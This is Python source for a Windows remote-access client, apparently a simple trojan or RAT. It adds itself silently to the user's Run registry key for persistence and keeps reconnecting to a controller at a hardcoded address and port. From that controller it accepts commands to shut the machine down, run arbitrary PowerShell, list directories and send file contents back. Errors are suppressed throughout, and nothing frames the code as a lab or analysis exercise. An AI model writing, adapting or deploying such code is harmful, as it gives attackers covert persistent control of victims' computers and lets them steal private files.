import socket
import winreg
import os
import sys
import time
import platform
import subprocess
import threading

HOST = "127.0.0.1"
PORT = 5000

hostname = platform.node()


def add_to_startup():
    app_name = "MyClient"

    if getattr(sys, 'frozen', False):
        path = sys.executable
    else:
        path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except:
        pass


def handle_command(cmd):
    cmd = cmd.strip()

    if cmd == "SHUTDOWN":
        subprocess.Popen("shutdown /s /t 0", shell=True)

    elif cmd.startswith("POWERSHELL|"):
        ps_command = cmd.split("|", 1)[1]
        subprocess.Popen(f'start powershell -NoExit -Command "{ps_command}"', shell=True)

    elif cmd.startswith("GET_FILES"):
        try:
            parts = cmd.split("|")

            if len(parts) > 1 and parts[1]:
                path = parts[1]
            else:
                path = os.path.join(os.path.expanduser("~"), "Desktop")

            if os.path.isdir(path):
                files = os.listdir(path)
                return "FILES|" + path + "|" + "||".join(files)
            else:
                return "FILES|" + path + "|"

        except:
            return "FILES|ERROR|"

    elif cmd.startswith("GET_FILE_CONTENT"):
        try:
            path = cmd.split("|", 1)[1]

            if os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                return f"FILE_CONTENT|{os.path.basename(path)}|{content}"
            else:
                return f"FILE_CONTENT|{os.path.basename(path)}|Не удалось открыть файл"

        except:
            return f"FILE_CONTENT|ERROR|Ошибка чтения"


def receiver_loop(s):
    while True:
        try:
            data = s.recv(4096).decode()
            if not data:
                break

            for line in data.split("\n"):
                if not line:
                    continue

                response = handle_command(line)

                if response:
                    s.send((response + "\n").encode())

        except:
            break


def sender_loop(s):
    while True:
        try:
            s.send(f"ONLINE|{hostname}".encode())
            time.sleep(5)
        except:
            break


def start_client():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            threading.Thread(target=sender_loop, args=(s,), daemon=True).start()
            receiver_loop(s)

        except:
            time.sleep(5)


add_to_startup()
start_client()